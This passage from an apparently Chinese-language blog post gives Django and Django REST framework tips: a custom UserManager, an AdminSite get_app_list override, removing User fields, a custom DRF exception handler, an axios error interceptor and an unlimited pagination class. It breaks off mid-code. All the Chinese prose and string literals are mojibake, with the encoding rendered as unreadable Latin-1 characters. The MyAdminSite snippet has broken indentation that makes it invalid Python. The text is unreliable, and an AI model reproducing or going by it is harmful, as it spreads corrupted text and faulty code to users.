<p>æ­¤å¤–,Djangoé»˜è®¤çš„ç”¨æˆ·<code>Manager</code>ç±»ä¸­çš„<code>create_user</code>å’Œ<code>create_superuser</code>æ–¹æ³•å†…éƒ¨ä¼šè°ƒç”¨<code>_create_user</code>æ–¹æ³•ç»™<code>is_staff</code>å­—æ®µè®¾ç½®é»˜è®¤å€¼å¹¶å†™å…¥æ•°æ®åº“.ä½†å®é™…ä¸Šæ•°æ®åº“ä¸­å¹¶ä¸å­˜åœ¨<code>is_staff</code>å­—æ®µ,ä»è€Œå¯¼è‡´æŠ¥é”™.å› æ­¤,æˆ‘ä»¬è¿˜éœ€é‡å†™<code>UserManager</code>ä¸­çš„<code>_create_user</code>æ–¹æ³•.</p>
<details>
<summary>models/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> UserManager <span class="keyword">as</span> BaseUserManager</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserManager</span>(BaseUserManager, SoftDeleteManagerMixin):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_create_user</span>(<span class="params">self, username, email, password, **extra_fields</span>):</span><br><span class="line">        extra_fields.pop(<span class="string">&quot;is_staff&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>()._create_user(username, email, password, **extra_fields)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    objects = UserManager()</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>


<div class="note warning">
  <p>Update 2023.09.03</p>
  é‡åˆ°äº†ç„å­¦é”™è¯¯...<br/>
  è¿˜æ˜¯è€è€å®å®ç”¨"é‡å†™AdminSite"å§....
</div>

<p>å½“é€šè¿‡å°†<code>User</code>ä¸­çš„<code>user_permissions</code>è®¾ç½®ä¸º<code>None</code>çš„æ–¹å¼æ¥ç§»é™¤Djangoé»˜è®¤åˆ›å»ºçš„è¡¨æ—¶.<br>å¦‚æœä¸€ä¸ªå·²ç»ç™»å½•è¿‡AdminSiteç«™ç‚¹çš„ç”¨æˆ·,ä»è¶…çº§ç”¨æˆ·å˜ä¸ºæ™®é€šç”¨æˆ·å,æ²¡æœ‰æ¸…ç†Cookieå°±å»è®¿é—®Adminç«™ç‚¹ä¼šæŠ¥é”™(é¢„æœŸæ•ˆæœå¦‚ä¸‹å›¾).åŸå› æ˜¯æ­¤æ—¶ç”¨æˆ·æ˜¯<code>is_authenticated</code>çš„,ä»è€Œç»•è¿‡äº†<code>has_permission</code>çš„æ£€æŸ¥.å¯¹äºæ™®é€šç”¨æˆ·,AdminSiteç±»ä¸­çš„<code>get_app_list</code>æ–¹æ³•å†…éƒ¨è°ƒç”¨çš„<code>has_module_permission</code>ä¼šå°è¯•è®¿é—®<code>user_user_permissions</code>ä»è€Œå¯¼è‡´æŠ¥é”™;å¯¹äºè¶…çº§ç”¨æˆ·,<code>has_module_permission</code>åˆ™ä¼šç›´æ¥è¿”å›ä¸ºTrue.<br>å¯ä»¥é€šè¿‡é‡å†™AdminSiteçš„<code>get_app_list</code>æ–¹æ³•æ¥è§£å†³.<br>    <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdminSite</span>(admin.AdminSite):</span><br><span class="line">		...</span><br><span class="line">      <span class="keyword">def</span> <span class="title function_">get_app_list</span>(<span class="params">self, request: WSGIRequest</span>):</span><br><span class="line">      <span class="keyword">if</span> request.user.is_superuser <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">          <span class="keyword">return</span> []</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>().get_app_list(request)</span><br></pre></td></tr></table></figure></p>
<img data-src="/posts/2053290144/admin.png" class="">

<h2 id="Remove-unused-User-field"><a href="#Remove-unused-User-field" class="headerlink" title="Remove unused User field"></a><a name="remove-unsed-user-field">Remove unused User field</a></h2><p>Djangoé»˜è®¤çš„ç”¨æˆ·æ¨¡å‹ä¸­æä¾›äº†ä¸€äº›é™„åŠ å­—æ®µ,å¦‚<code>first_name</code>ã€<code>last_name</code>ç­‰.å¦‚æœæƒ³ç§»é™¤è¿™äº›ä¸éœ€è¦çš„å­—æ®µ,å¯ä»¥åœ¨<code>Model</code>ä¸­å°†å®ƒä»¬è®¾ç½®ä¸º<code>None</code>,å°†è¿™äº›å­—æ®µä»æ•°æ®åº“ä¸­åˆ é™¤.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line">    first_name = <span class="literal">None</span></span><br><span class="line">    last_name = <span class="literal">None</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>ç”±äºDjangoé»˜è®¤çš„<code>UserAdmin</code>å¯èƒ½ä¼šå°è¯•å±•ç¤ºå·²è¢«ç§»é™¤çš„å­—æ®µ,å¯¼è‡´æŠ¥é”™,å› æ­¤æˆ‘ä»¬è¿˜éœ€è¦è‡ªå®šä¹‰<code>UserAdmin</code>æ¥è¦†ç›–åŸæœ‰é€»è¾‘,å¦‚<code>list_display</code>ã€<code>fieldsets</code>ç­‰.å®Œæ•´ä¾‹å­è§<a href="#override-user-admin">UserAdmin</a></p>
<details open>
<summary>admin/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.admin <span class="keyword">import</span> UserAdmin <span class="keyword">as</span> DjangoUserAdmin</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserAdmin</span>(<span class="title class_ inherited__">DjangoUserAdmin</span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<h2 id="Exception-Handle"><a href="#Exception-Handle" class="headerlink" title="Exception Handle"></a><a name="exception-handle">Exception Handle</a></h2><h3 id="BackEnd"><a href="#BackEnd" class="headerlink" title="BackEnd"></a><a name="exception-handle-backend">BackEnd</a></h3><h4 id="DRFä¸­é”™è¯¯å“åº”çš„ç»“æ„"><a href="#DRFä¸­é”™è¯¯å“åº”çš„ç»“æ„" class="headerlink" title="DRFä¸­é”™è¯¯å“åº”çš„ç»“æ„"></a><a name="drfä¸­é”™è¯¯å“åº”çš„ç»“æ„">DRFä¸­é”™è¯¯å“åº”çš„ç»“æ„</a></h4><p>é¦–å…ˆ,æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹<a href="https://www.django-rest-framework.org/api-guide/exceptions/#exceptions">DRFä¸­é”™è¯¯å“åº”</a>çš„ç»“æ„:</p>
<ul>
<li><p>å¯¹äºå¤§å¤šæ•°å¼‚å¸¸,DRFä¼šè¿”å›ä¸€ä¸ªå½¢å¦‚<code>&#123;&quot;detail&quot;: &quot;Method &#39;DELETE&#39; not allowed.&quot;&#125;</code>çš„ç»“æ„,ä¸€å®šåŒ…å«<code>detail</code>é”®.</p>
</li>
<li><p>å¯¹äº<code>ValidationError</code>,ä¼šè¿”å›ä¸€ä¸ªä»¥å­—æ®µåç§°ä½œä¸ºkey,é”™è¯¯ä¿¡æ¯æ•°ç»„ä¸ºvalueçš„ç»“æ„;ä¸å±äºæŸä¸ªç‰¹å®šå­—æ®µçš„å¼‚å¸¸ä¼šä½¿ç”¨settingä¸­<code>NON_FIELD_ERRORS_KEY</code>çš„å€¼(é»˜è®¤å€¼ä¸º<code>non_field_errorsÂ·</code>)ä½œä¸ºkey.</p>
</li>
</ul>
<details open>
<summary>ValidationError Response</summary>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;field1&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;Error message 2&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;field2&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message 3&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;non_field_errors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

</details>

<h4 id="ValidationErrorçš„ä½¿ç”¨"><a href="#ValidationErrorçš„ä½¿ç”¨" class="headerlink" title="ValidationErrorçš„ä½¿ç”¨"></a><a name="validationerrorçš„ä½¿ç”¨">ValidationErrorçš„ä½¿ç”¨</a></h4><p><a href="https://www.django-rest-framework.org/api-guide/exceptions/#validationerror">ValidationError</a>(detail, code&#x3D;None)å¿…é¡»ä¼ å…¥detailå‚æ•°,detailå¯ä»¥æ˜¯listæˆ–dict,ä¹Ÿå¯ä»¥æ˜¯åµŒå¥—ç»“æ„.</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡serializersä¸­çš„<code>validate_&lt;field_name&gt;</code>æ–¹æ³•å¯¹ç‰¹å®šçš„<a href="https://www.django-rest-framework.org/api-guide/serializers/#field-level-validation">æŸä¸ªå­—æ®µè¿›è¡ŒéªŒè¯</a>,raiseå¼‚å¸¸æ—¶detailå‚æ•°å¯ä»¥ä¸ºstr&#x2F;list,DRFæœ€ç»ˆä¼šå°†å…¶è½¬æ¢ä¸º<code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;xxxx&#39;, &#39;yyyy&#39;]&#125;</code>çš„ç»“æ„.</p>
<ul>
<li><code>ValidationError(&#39;Invalid &lt;filed_name&gt;.&#39;)</code> -&gt; <code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;Invalid &lt;filed_name&gt;.&#39;]&#125;</code></li>
<li><code>ValidationError([&#39;Invalid msg 1&#39;,&#39;Invalid msg 2&#39;])</code> -&gt; <code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;Invalid msg 1&#39;, &#39;Invalid msg 2&#39;]&#125;</code></li>
</ul>
<p>ä¹Ÿå¯ä»¥åœ¨<code>validate</code>æ–¹æ³•ä¸­å¯¹å¤šä¸ªå­—æ®µè¿›è¡ŒéªŒè¯,æ­¤æ—¶raiseå¼‚å¸¸æ—¶detailå‚æ•°å¯ä»¥ä¸ºstr&#x2F;list&#x2F;dict.</p>
<ul>
<li><code>ValidationError(&#123;&#39;title&#39;: &#39;Invalid title&#39;&#125;)</code> -&gt; <code>&#123;&#39;title&#39;: [&#39;Invalid title&#39;]&#125;</code></li>
<li><code>ValidationError(&#123;&#39;title&#39;: [&#39;Invalid title&#39;,&#39;Invalid title 2&#39;]&#125;)</code> -&gt; <code>&#123;&#39;title&#39;: [&#39;Invalid title&#39;,&#39;Invalid title 2&#39;]&#125;</code></li>
<li><code>ValidationError(&#39;Error message1&#39;)</code> -&gt; <code>&#123;&#39;non_field_errors&#39;: [&#39;Error message1&#39;]&#125;</code></li>
<li><code>ValidationError([&#39;Error message1&#39;,&#39;Error message2&#39;])</code> -&gt; <code>&#123;&#39;non_field_errors&#39;: [&#39;Error message1&#39;, &#39;Error message2&#39;]&#125;</code></li>
</ul>
<h4 id="Custom-exception-handling"><a href="#Custom-exception-handling" class="headerlink" title="Custom exception handling"></a><a name="custom-exception-handling">Custom exception handling</a></h4><p>æœ‰æ—¶å€™æˆ‘ä»¬ä¸å¾—ä¸åœ¨serializersçš„create&#x2F;updateä¸­æ–¹æ³•ä¸­raise ValidationError,æ­¤æ—¶DRFè¿”å›çš„ç»“æœä¸º[&quot;Error in create&quot;],ä¸ä¸Š<br>è¿°ç»“æ„ä¸ç¬¦.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestSerializer</span>(serializers.Serializer):</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">self, validated_data</span>):</span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">raise</span> serializers.ValidationError(<span class="string">&#x27;Error in create.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å› æ­¤,æˆ‘ä»¬è¿˜éœ€è¦<a href="https://www.django-rest-framework.org/api-guide/exceptions/#custom-exception-handling">è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†</a>æ¥å¤„ç†è¿™ç§æƒ…å†µ,ä»¥æ­¤ä¿è¯é”™è¯¯å“åº”ç»“æ„çš„ç»Ÿä¸€.<br>ä»¥åŠå¯¹äºéé¢„æœŸçš„å¼‚å¸¸è¿›è¡Œç»Ÿä¸€å¤„ç†,å°†é”™è¯¯ä¿¡æ¯å­˜å‚¨äº<code>detail</code>å­—æ®µä¸­,å¹¶è¿”å›500 Internal Server Error.</p>
<details>
<summary>lib.rest_framework.exception_handler.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> exceptions, serializers, status</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_exception_handler</span>(<span class="params">exc, context</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(exc, exceptions.ValidationError):</span><br><span class="line">        exc = exceptions.ValidationError(detail=serializers.as_serializer_error(exc))</span><br><span class="line"></span><br><span class="line">    response = exception_handler(exc, context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># request = context[&quot;request&quot;] # Logging or other things</span></span><br><span class="line">        <span class="keyword">if</span> settings.DEBUG <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;<span class="string">&quot;detail&quot;</span>: <span class="built_in">str</span>(exc)&#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;<span class="string">&quot;detail&quot;</span>: <span class="string">&quot;Server Error (500)&quot;</span>&#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR,</span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

</details>

<h3 id="FrontEnd"><a href="#FrontEnd" class="headerlink" title="FrontEnd"></a><a name="exception-handle-frontend">FrontEnd</a></h3><p>å‰ç«¯çš„é”™è¯¯å“åº”å¤„ç†åˆ™ä¸»è¦åˆ†ä¸ºä¸‰ç§ç±»å‹:</p>
<ul>
<li>400 Bad Request<ul>
<li>ä¼˜å…ˆä»detailå­—æ®µè·å–å¼‚å¸¸ä¿¡æ¯</li>
<li>detailå­—æ®µä¸ºç©ºæ—¶,ç”¨<code>NON_FIELD_ERRORS_KEY</code>(è¿™é‡Œè®¾ç½®ä¸ºerrors)çš„å€¼ä½œä¸ºå¼‚å¸¸ä¿¡æ¯</li>
<li>å¦åˆ™,éå†é”™è¯¯å“åº”æ•°æ®,é€è¡Œå±•ç¤ºæ¯ä¸ªå­—æ®µçš„é”™è¯¯ä¿¡æ¯</li>
</ul>
</li>
<li>401 Unauthorized<ul>
<li>ç™»å½•æ¥å£çš„è¯·æ±‚ç›´æ¥reject</li>
<li>éç™»å½•æ¥å£çš„GETè¯·æ±‚,æç¤ºç”¨æˆ·é‡æ–°ç™»å½•</li>
<li>éç™»å½•æ¥å£çš„éGETè¯·æ±‚,æç¤ºç”¨æˆ·é€‰æ‹©&quot;ç›´æ¥é‡æ–°ç™»å½•&quot;&#x2F;&quot;åœ¨æ–°çª—å£ç™»å½•&quot;,é˜²æ­¢ç”¨æˆ·å¡«å†™çš„è¡¨å•æ•°æ®ä¸¢å¤±</li>
</ul>
</li>
<li>å…¶ä»– -&gt; ç›´æ¥ä¾æ®HTTPçŠ¶æ€ç å¼¹çª—æç¤ºå³å¯</li>
</ul>
<details>
<summary>request.js</summary>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">MessageBox</span>, <span class="title class_">Message</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">service.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> status = error.<span class="property">response</span>.<span class="property">status</span>;</span><br><span class="line">    <span class="keyword">const</span> method = error.<span class="property">response</span>.<span class="property">config</span>.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">const</span> data = error.<span class="property">response</span>.<span class="property">data</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; errors = [], detail = <span class="literal">null</span> &#125; = data;</span><br><span class="line">    <span class="keyword">if</span> (status === <span class="number">400</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (detail !== <span class="literal">null</span>) &#123;</span><br><span class="line">        msg = detail;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (errors.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        msg = errors.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> data === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        msg = <span class="title class_">Object</span>.<span class="title function_">entries</span>(data)</span><br><span class="line">          .<span class="title function_">map</span>(<span class="function">(<span class="params">[key, value]</span>) =&gt;</span> <span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(value)&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">join</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">401</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (error.<span class="property">response</span>.<span class="property">config</span>.<span class="property">url</span> !== <span class="string">&#x27;/account/login/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">          <span class="title class_">MessageBox</span>.<span class="title function_">alert</span>(<span class="string">&#x27;ç”±äºç”¨æˆ·é•¿æ—¶é—´æœªæ“ä½œ,è¯·é‡æ–°ç™»å½•!&#x27;</span>, <span class="string">&#x27;é”™è¯¯æç¤º&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">            <span class="attr">confirmButtonText</span>: <span class="string">&#x27;é‡æ–°ç™»å½•&#x27;</span>,</span><br><span class="line">          &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// é‡æ–°ç™»å½•</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// Close</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title class_">MessageBox</span>.<span class="title function_">alert</span>(</span><br><span class="line">            <span class="string">&#x27;ç™»å½•çŠ¶æ€å·²å¤±æ•ˆ,æ‚¨å¯åœ¨æ–°çª—å£ç™»å½•æˆåŠŸåè¿”å›å½“å‰é¡µé¢&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;æç¤º&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">type</span>: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">              <span class="attr">distinguishCancelAndClose</span>: <span class="literal">true</span>,</span><br><span class="line">              <span class="attr">confirmButtonText</span>: <span class="string">&#x27;åœ¨æ–°çª—å£ç™»å½•&#x27;</span>,</span><br><span class="line">              <span class="attr">cancelButtonText</span>: <span class="string">&#x27;ç›´æ¥é‡æ–°ç™»å½•&#x27;</span>,</span><br><span class="line">              <span class="attr">showCancelButton</span>: <span class="literal">true</span>,</span><br><span class="line">            &#125;</span><br><span class="line">          )</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// åœ¨æ–°çª—å£ç™»å½•</span></span><br><span class="line">              <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">(<span class="params">action</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (action === <span class="string">&#x27;cancel&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// ç›´æ¥é‡æ–°ç™»å½•</span></span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Close</span></span><br><span class="line">                <span class="title class_">Message</span>(&#123;</span><br><span class="line">                  <span class="attr">message</span>: <span class="string">&#x27;å–æ¶ˆ!&#x27;</span>,</span><br><span class="line">                  <span class="attr">type</span>: <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">                &#125;);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">403</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;ä½ æ²¡æœ‰æƒé™, è¯·è”ç³»ç®¡ç†å‘˜&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">500</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;æœåŠ¡å™¨å†…éƒ¨é”™è¯¯&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">502</span> || status === <span class="number">504</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;æœåŠ¡å™¨å¼€å°å·®äº†&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      msg = <span class="string">`HTTP <span class="subst">$&#123;status&#125;</span>-é”™è¯¯<span class="subst">$&#123;detail ? <span class="string">&#x27;:&#x27;</span> + detail : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Message</span>(&#123;</span><br><span class="line">      <span class="attr">message</span>: msg,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="number">5</span> * <span class="number">1000</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

</details>

<h1 id="Django-REST-framework"><a href="#Django-REST-framework" class="headerlink" title="Django REST framework"></a><a name="django-rest-framework">Django REST framework</a></h1><h2 id="Pagination-unlimited"><a href="#Pagination-unlimited" class="headerlink" title="Pagination unlimited"></a><a name="pagination-unlimited">Pagination unlimited</a></h2><p>åœ¨ä¸€äº›åœºæ™¯ä¸­(å¦‚ä¸‹æ‹‰æ¡†é€‰é¡¹),æˆ‘ä»¬å¯èƒ½éœ€è¦ä¸€æ¬¡æ€§ä»åˆ†é¡µæ¥å£è·å–æ‰€æœ‰æ•°æ®,é€šå¸¸çš„åšæ³•æ˜¯å‰ç«¯ä¼ é€’ä¸€ä¸ªéå¸¸éå¸¸å¤§çš„page_size.å€ŸåŠ©DRFï¼ˆDjango Rest Frameworkï¼‰ä¸­çš„è‡ªå®šä¹‰åˆ†é¡µç±»,æˆ‘ä»¬å¯ä»¥æ›´ä¼˜é›…çš„å®ç°æ— é™åˆ¶åˆ†é¡µ,å…·ä½“æ­¥éª¤å¦‚ä¸‹:</p>
<ul>
<li>åˆ›å»ºæ–°çš„åˆ†é¡µç±»,å¹¶åœ¨<code>settings.py</code>ä¸­é…ç½®</li>
<li>åç«¯é€šè¿‡ç‰¹å®šçš„å‚æ•°(å¦‚<code>pagination_unlimited</code>)æ¥è¡¨ç¤ºå¼€å¯æ— é™åˆ¶åˆ†é¡µ,åœ¨éœ€è¦å¼€å¯çš„è§†å›¾ä¸­å£°æ˜ä¸ºTrue</li>
<li>å‰ç«¯ä¼ é€’ä¸€ä¸ªç‰¹å®šçš„å‚æ•°(å¦‚<code>unlimited</code>)æ¥è¡¨ç¤ºæ— é™åˆ¶çš„åˆ†é¡µ,ä»¥è·å–æ‰€æœ‰æ•°æ®</li>
<li><a href="https://www.django-rest-framework.org/api-guide/pagination/#using-your-custom-pagination-class">Pagination - Django REST framework</a></li>
</ul>
<details open>
<summary>Setting pagination class in settings.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="string">&quot;DEFAULT_PAGINATION_CLASS&quot;</span>: <span class="string">&quot;lib.rest_framework.pagination.PageNumberPagination&quot;</span>,</span><br><span class="line">  <span class="string">&quot;PAGE_SIZE&quot;</span>: <span class="number">25</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<details>
<summary>lib/rest_framewor/pagination.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> pagination</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PageNumberPagination</span>(pagination.PageNumberPagination):</span><br><span class="line">    page_size_query_param = <span class="string">&quot;page_size&quot;</span></span><br><span class="line">    unlimited_query_param = <span class="string">&quot;unlimited&quot;</span></span><br><span class="line">    unlimited_query_description = (</span><br><span class="line">        <span class="string">&quot;A boolean value to indicate whether return all results.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    unlimited_view_attribute = <span class="string">&quot;pagination_unlimited&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_schema_operation_parameters</span>(<span class="params">self, view</span>):</span><br><span class="line">        parameters = <span class="built_in">super</span>().get_schema_operation_parameters(view)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            parameters.append(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="variable language_">self</span>.unlimited_query_param,</span><br><span class="line">                    <span class="string">&quot;required&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                    <span class="string">&quot;in&quot;</span>: <span class="string">&quot;query&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="variable language_">self</span>.unlimited_query_description,</span><br><span class="line">                    <span class="string">&quot;schema&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_unlimited</span>(<span class="params">self, request</span>):</span><br><span class="line">        unlimited = request.query_params.get(<span class="variable language_">self</span>.unlimited_query_param, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> unlimited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span 